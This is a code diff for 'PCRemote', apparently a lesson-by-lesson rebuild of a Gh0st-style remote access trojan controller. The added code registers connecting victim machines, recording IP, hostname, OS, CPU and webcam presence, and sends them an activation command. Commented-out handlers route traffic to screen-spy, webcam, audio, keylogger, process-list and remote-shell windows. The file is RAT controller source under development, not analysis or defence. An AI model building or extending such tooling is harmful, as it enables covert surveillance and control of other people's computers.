@@ -7,6 +7,7 @@
 #include "PCRemoteDlg.h"
 #include "afxdialogex.h"
 #include "SettingDlg.h"
+#include "../thirdpart/macros.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -32,6 +33,9 @@ COLUMNSTRUCT g_Column_Message_Data[] =
 	{ "信息内容",	    660 }
 };
 int g_Column_Message_Width = 0;  //列总宽度
+
+CIOCPServer* m_iocpServer = NULL;
+CPCRemoteDlg *g_pPCRemoteDlg = NULL;
 
 static UINT indicators[] =
 {
@@ -76,9 +80,10 @@ END_MESSAGE_MAP()
 
 
 CPCRemoteDlg::CPCRemoteDlg(CWnd* pParent /*=NULL*/)
-	: CDialogEx(IDD_PCREMOTE_DIALOG, pParent), m_iCount(0), m_iocpServer(NULL)
+	: CDialogEx(IDD_PCREMOTE_DIALOG, pParent), m_iCount(0)
 {
 	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
+	g_pPCRemoteDlg = this;
 }
 
 void CPCRemoteDlg::DoDataExchange(CDataExchange* pDX)
@@ -113,6 +118,7 @@ BEGIN_MESSAGE_MAP(CPCRemoteDlg, CDialogEx)
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
 	ON_COMMAND(IDM_NOTIFY_SHOW, &CPCRemoteDlg::OnNotifyShow)
 	ON_COMMAND(IDM_NOTIFY_CLOSE, &CPCRemoteDlg::OnNotifyClose)
+	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)        //跟进  OnAddToList
 	ON_WM_CLOSE()
 END_MESSAGE_MAP()
 
@@ -166,7 +172,7 @@ BOOL CPCRemoteDlg::OnInitDialog()
 	MoveWindow(rect);
 
 	ListenPort();  //开始监听
-	this->Test();
+//	this->Test();
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
@@ -313,6 +319,18 @@ void CPCRemoteDlg::InitListCtrl()
 }
 
 void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)
+{
+	m_CList_Online.InsertItem(0, strIP);           //默认为0行  这样所有插入的新列都在最上面
+	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);      //设置列的显示字符   这里 ONLINELIST_ADDR等 为第二节课中的枚举类型 用这样的方法
+	m_CList_Online.SetItemText(0, ONLINELIST_COMPUTER_NAME, strPCName); //解决问题会避免以后扩展时的冲突
+	m_CList_Online.SetItemText(0, ONLINELIST_OS, strOS);
+	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
+	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
+	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
+	this->ShowMessageLog(true, strIP + "主机上线");
+}
+
+void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing, ClientContext	*pContext)
 {
 	m_CList_Online.InsertItem(0, strIP);           //默认为0行  这样所有插入的新列都在最上面
 	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);      //设置列的显示字符   这里 ONLINELIST_ADDR等 为第二节课中的枚举类型 用这样的方法
@@ -654,7 +672,7 @@ void CALLBACK CPCRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext *pContext, 
 											 //回到OnClientReading 继续向下分析
 			break;
 		case NC_RECEIVE_COMPLETE:
-		//	ProcessReceiveComplete(pContext);      //就是这里 数据解压 还原后在调用 ProcessReceiveComplete 转到ProcessReceiveComplete
+			ProcessReceiveComplete(pContext);      //就是这里 数据解压 还原后在调用 ProcessReceiveComplete 转到ProcessReceiveComplete
 			break;
 		}
 	}
@@ -717,4 +735,209 @@ void CPCRemoteDlg::Destroy()
 		delete m_iocpServer;
 		m_iocpServer = NULL;
 	}
+}
+
+void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
+{
+	if (pContext == NULL)
+		return;
+
+	// 如果管理对话框打开，交给相应的对话框处理
+	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];
+
+	// 交给窗口处理
+	/*if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
+	{
+	switch (pContext->m_Dialog[0])
+	{
+	case FILEMANAGER_DLG:
+	((CFileManagerDlg *)dlg)->OnReceiveComplete();
+	break;
+	case SCREENSPY_DLG:
+	((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+	break;
+	case WEBCAM_DLG:
+	((CWebCamDlg *)dlg)->OnReceiveComplete();
+	break;
+	case AUDIO_DLG:
+	((CAudioDlg *)dlg)->OnReceiveComplete();
+	break;
+	case KEYBOARD_DLG:
+	((CKeyBoardDlg *)dlg)->OnReceiveComplete();
+	break;
+	case SYSTEM_DLG:
+	((CSystemDlg *)dlg)->OnReceiveComplete();
+	break;
+	case SHELL_DLG:
+	((CShellDlg *)dlg)->OnReceiveComplete();
+	break;
+	default:
+	break;
+	}
+	return;
+	}*/
+
+	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
+	{                                                           //讲解后回到ClientContext结构体
+																/*case TOKEN_AUTH: // 要求验证
+																m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
+																break;
+																case TOKEN_HEARTBEAT: // 回复心跳包
+																{
+																BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
+																m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+																}
+
+																break;*/
+	case TOKEN_LOGIN: // 上线包
+
+	{
+		//这里处理上线
+		if (m_iocpServer->m_nMaxConnections <= g_pPCRemoteDlg->m_CList_Online.GetItemCount())
+		{
+			closesocket(pContext->m_Socket);
+		}
+		else
+		{
+			pContext->m_bIsMainSocket = true;
+			g_pPCRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
+		}
+		// 激活
+		BYTE	bToken = COMMAND_ACTIVED;
+		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
+	}
+
+	break;
+	/*case TOKEN_DRIVE_LIST: // 驱动器列表
+	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
+	g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
+	break;
+	case TOKEN_BITMAPINFO: //
+	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
+	g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
+	break;
+	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
+	g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
+	break;
+	case TOKEN_AUDIO_START: // 语音
+	g_pConnectView->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
+	break;
+	case TOKEN_KEYBOARD_START:
+	g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
+	break;
+	case TOKEN_PSLIST:
+	g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
+	break;
+	case TOKEN_SHELL_START:
+	g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+	break;*/
+	// 命令停止当前操作
+	default:
+		closesocket(pContext->m_Socket);
+		break;
+	}
+}
+
+
+LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam, LPARAM lParam)
+{
+	CString strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing;
+	ClientContext	*pContext = (ClientContext *)lParam;    //注意这里的  ClientContext  正是发送数据时从列表里取出的数据
+
+	if (pContext == NULL)
+		return -1;
+
+	CString	strToolTipsText;
+	try
+	{
+		//int nCnt = m_pListCtrl->GetItemCount();
+
+		// 不合法的数据包
+		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
+			return -1;
+
+		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
+
+		// ID
+		//CString	str;
+		//str.Format("%d", m_nCount++);	
+
+		// IP地址
+		//int i = m_pListCtrl->InsertItem(nCnt, str, 15);
+
+		// 外网IP
+
+		sockaddr_in  sockAddr;
+		memset(&sockAddr, 0, sizeof(sockAddr));
+		int nSockAddrLen = sizeof(sockAddr);
+		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
+		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
+		//m_pListCtrl->SetItemText(i, 1, IPAddress);
+		strIP = IPAddress;
+
+		// 内网IP
+		//m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
+		//strAddr=inet_ntoa(LoginInfo->IPAddress);
+		// 主机名
+		//m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
+		strPCName = LoginInfo->HostName;
+		// 系统
+
+		////////////////////////////////////////////////////////////////////////////////////////
+		// 显示输出信息
+		char *pszOS = NULL;
+		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
+		{
+
+		case VER_PLATFORM_WIN32_NT:
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4)
+				pszOS = "NT";
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
+				pszOS = "2000";
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1)
+				pszOS = "XP";
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2)
+				pszOS = "2003";
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
+				pszOS = "Vista";  // Just Joking
+		}
+		strOS.Format
+		(
+			"%s SP%d (Build %d)",
+			//OsVerInfo.szCSDVersion,
+			pszOS,
+			LoginInfo->OsVerInfoEx.wServicePackMajor,
+			LoginInfo->OsVerInfoEx.dwBuildNumber
+		);
+		//m_pListCtrl->SetItemText(i, 4, strOS);
+
+		// CPU
+		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
+		//m_pListCtrl->SetItemText(i, 5, str);
+
+		// Speed
+		strPing.Format("%d", LoginInfo->dwSpeed);
+		//m_pListCtrl->SetItemText(i, 6, str);
+
+
+		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
+		//m_pListCtrl->SetItemText(i, 7, str);
+
+		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);
+
+		if (((CPCRemoteApp *)AfxGetApp())->m_bIsQQwryExist)
+		{
+
+			strAddr = m_QQwry->IPtoAdd(IPAddress);
+
+			//strToolTipsText += "\nArea: ";
+			//strToolTipsText += str;
+		}
+		// 指定唯一标识
+		//m_pListCtrl->SetItemData(i, (DWORD) pContext);    //这里将服务端的套接字等信息加入列表中保存
+		AddList(strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing, pContext);
+	}
+	catch (...) {}
+
+	return 0;
 }
